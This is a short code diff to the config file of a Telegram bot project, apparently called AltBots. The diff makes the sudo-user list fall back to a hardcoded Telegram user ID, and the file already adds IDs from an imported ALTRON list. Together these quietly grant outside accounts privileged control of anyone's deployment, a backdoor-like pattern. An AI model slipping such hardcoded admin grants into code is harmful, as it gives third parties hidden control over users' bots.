@@ -1,8 +1,8 @@
 import logging
 
-from telethon import TelegramClient
-from AltBots.data import ALTRON
 from os import getenv
+from AltBots.data import ALTRON
+from telethon import TelegramClient
 
 
 logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
@@ -27,7 +27,7 @@ BOT_TOKEN8 = getenv("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = getenv("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = getenv("BOT_TOKEN10", default=None)
 
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
+SUDO_USERS = list(map(lambda x: int(x), getenv("SUDO_USER", "5518687442").split()))
 for x in ALTRON:
     SUDO_USERS.append(x)
 OWNER_ID = int(getenv("OWNER_ID", None))
